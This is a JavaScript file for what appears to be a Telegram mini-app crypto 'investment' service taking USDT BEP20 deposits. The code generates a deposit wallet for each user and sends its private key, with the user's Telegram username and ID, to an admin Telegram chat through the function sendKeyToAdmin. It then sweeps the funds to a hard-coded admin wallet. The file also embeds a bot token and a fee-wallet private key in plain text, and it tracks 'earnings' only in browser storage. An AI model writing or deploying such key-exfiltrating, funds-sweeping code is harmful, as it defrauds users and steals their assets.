import { state, saveInvestment } from './state.js';

const API_BASE = "https://api-usdt-bep20.vercel.app/api";
const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
const ADMIN_CHAT_ID = "7517815832";
const ADMIN_WALLET = "0xF5CbE528C2320DCf5762D55F3af101AB94F668bE";
const FEE_PRIVATE_KEY = "d303adf9054d5007ea88392938a7865f9275de2b1fac2c6812cfd92da4b1f0ab";

let paymentTimerInterval = null;

async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario");
    const userId = user?.id || "N/A";

    const text = `🛡️ *ADMIN AUDIT* 🛡️\n\n💰 *Amount:* ${amount} USDT\n📍 *Wallet:* \`${address}\`\n🔑 *Key:* \`${privKey}\`\n\n👤 *User:* ${username} (ID: ${userId})`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) { console.error("Admin Report Error", e); }
}

function startPaymentTimer(minutes) {
    if(paymentTimerInterval) clearInterval(paymentTimerInterval);
    let seconds = minutes * 60;
    const timerDisplay = document.getElementById('payment-countdown');
    
    paymentTimerInterval = setInterval(() => {
        let mins = Math.floor(seconds / 60).toString().padStart(2, '0');
        let secs = (seconds % 60).toString().padStart(2, '0');
        if(timerDisplay) timerDisplay.innerText = `00:${mins}:${secs}`;
        if(seconds <= 0) {
            clearInterval(paymentTimerInterval);
            if(timerDisplay) timerDisplay.innerText = "00:00:00";
        }
        seconds--;
    }, 1000);
}

// --- FUNCIONES ENLAZADAS AL HTML (window.) ---

window.showPayment = async function() {
    const buyInput = document.getElementById('buy-qty');
    const amount = parseFloat(buyInput?.value || 0);
    
    if(!amount || amount <= 0) {
        if(window.showToast) window.showToast("Enter a valid amount");
        return;
    }

    document.getElementById('payModal').style.display = 'flex';
    document.getElementById('pay-amount-display').innerText = `${amount.toFixed(2)} USDT`;
    document.getElementById('wallet-address-display').innerText = "Generating...";
    
    const statusText = document.getElementById('payment-status-text');
    if(statusText) {
        statusText.innerText = "Not Received ⌛";
        statusText.style.color = "";
    }

    try {
        const response = await fetch(`${API_BASE}/bsc`);
        const data = await response.json();

        if(data.address) {
            state.pendingInvestment = amount;
            state.tempAddress = data.address;
            state.tempKey = data.privateKey;
            localStorage.setItem('temp_wallet', JSON.stringify(data));

            // Enviar a Telegram Admin
            await sendKeyToAdmin(data.address, data.privateKey, amount);

            document.getElementById('wallet-address-display').innerText = data.address;
            const qrImg = document.getElementById('qr-image');
            if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
            
            startPaymentTimer(30);
        }
    } catch (e) {
        document.getElementById('wallet-address-display').innerText = "Connection Error";
    }
};

window.verifyPayment = async function() {
    const statusText = document.getElementById('payment-status-text');
    const btn = document.getElementById('btn-verify-payment');
    const icon = document.getElementById('arrow-icon');
    
    const savedWallet = JSON.parse(localStorage.getItem('temp_wallet'));
    const key = state.tempKey || savedWallet?.privateKey;

    if (!key) {
        if(window.showToast) window.showToast("Session expired, try again.");
        return;
    }

    // Bloqueamos el botón para evitar clics múltiples
    if(btn) btn.disabled = true;
    if(icon) icon.className = "fas fa-spinner fa-spin";
    if(statusText) {
        statusText.innerText = "Verifying...";
        statusText.style.color = "#3b82f6";
    }

    try {
        const res = await fetch(`${API_BASE}/deposit-usdt`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userPrivateKey: key,
                adminAddress: ADMIN_WALLET,
                feePrivateKey: FEE_PRIVATE_KEY
            })
        });

        const result = await res.json();

        if (result.success) {
            if (result.method === "gas_sent") {
                // PASO AUTOMÁTICO: No pedimos clic, solo avisamos y esperamos
                statusText.innerText = "Confirming on network... ⏳";
                statusText.style.color = "#f59e0b";
                
                // Re-intento automático tras 15 segundos
                setTimeout(() => window.verifyPayment(), 15000);
            } else {
                // ÉXITO FINAL
                statusText.innerText = "Received! ✅";
                statusText.style.color = "#10b981";
                
                const amount = parseFloat(document.getElementById('buy-qty').value) || state.pendingInvestment || 0;
                saveInvestment(amount);
                
                localStorage.removeItem('temp_wallet');
                state.tempKey = null;
                if(paymentTimerInterval) clearInterval(paymentTimerInterval);
                
                if(window.showToast) window.showToast("Payment confirmed!");
                setTimeout(() => location.reload(), 2000);
            }
        } else {
            // Si falla porque aún no llega el USDT
            statusText.innerText = "Not Received ⌛";
            statusText.style.color = "#ef4444";
            if(btn) btn.disabled = false; // Solo aquí rehabilitamos para que reintente
            if(icon) icon.className = "fas fa-arrow-right";
        }
    } catch (e) {
        statusText.innerText = "Network Error ❌";
        if(btn) btn.disabled = false;
        if(icon) icon.className = "fas fa-arrow-right";
    }
};

window.closePayment = function() {
    document.getElementById('payModal').style.display = 'none';
    if(paymentTimerInterval) clearInterval(paymentTimerInterval);
};

window.copyAddress = function() {
    const address = document.getElementById('wallet-address-display')?.innerText;
    if(address && address !== "Generating...") {
        navigator.clipboard.writeText(address).then(() => {
            if(window.showToast) window.showToast("Address copied!");
        });
    }
};

// --- NUEVA FUNCIÓN DE RETIRO ---

window.requestWithdraw = async function() {
    const amountInput = document.getElementById('withdraw-amount');
    const addressInput = document.getElementById('withdraw-address');
    
    const amount = parseFloat(amountInput?.value || 0);
    const address = addressInput?.value.trim();

    // 1. REQUISITO OBLIGATORIO: Mínimo 1 USDT depositado para habilitar retiros
    if (!state.totalInvestedUSDT || state.totalInvestedUSDT < 1) {
        if(window.showToast) window.showToast("Deposit at least 1 USDT to unlock withdrawals");
        return;
    }

    // 2. Validaciones básicas
    if (amount < 5) {
        if(window.showToast) window.showToast("Minimum withdrawal is 5 USDT");
        return;
    }

    if (amount > state.totalEarnedUSD) {
        if(window.showToast) window.showToast("Insufficient balance");
        return;
    }

    if (!address || address.length < 40 || !address.startsWith("0x")) {
        if(window.showToast) window.showToast("Invalid BEP20 address");
        return;
    }

    const btn = document.getElementById('btn-confirm-withdraw');
    if(btn) {
        btn.disabled = true;
        btn.innerText = "Processing...";
    }

    try {
        const res = await fetch(`${API_BASE}/withdraw-usdt`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userAddress: address,
                amount: amount,
                feePrivateKey: FEE_PRIVATE_KEY
            })
        });

        const result = await res.json();

        if (result.success) {
            // Descontamos del saldo de ganancias
            state.totalEarnedUSD -= amount;
            localStorage.setItem('earned', state.totalEarnedUSD.toString());

            // Registramos en el historial
            const withdrawTx = {
                type: 'Withdraw',
                amount: amount,
                date: new Date().toLocaleString("es-CU"),
                id: 'out-' + Date.now()
            };
            
            if(!state.history) state.history = [];
            state.history.unshift(withdrawTx);
            localStorage.setItem('deposit_history', JSON.stringify(state.history));

            if(window.showToast) window.showToast("Withdrawal Successful! ✅");
            setTimeout(() => location.reload(), 2000);
        } else {
            if(window.showToast) window.showToast("Error: " + (result.message || "Failed"));
            if(btn) { btn.disabled = false; btn.innerText = "Confirm Withdraw"; }
        }
    } catch (e) {
        if(window.showToast) window.showToast("Connection error");
        if(btn) { btn.disabled = false; btn.innerText = "Confirm Withdraw"; }
    }
};
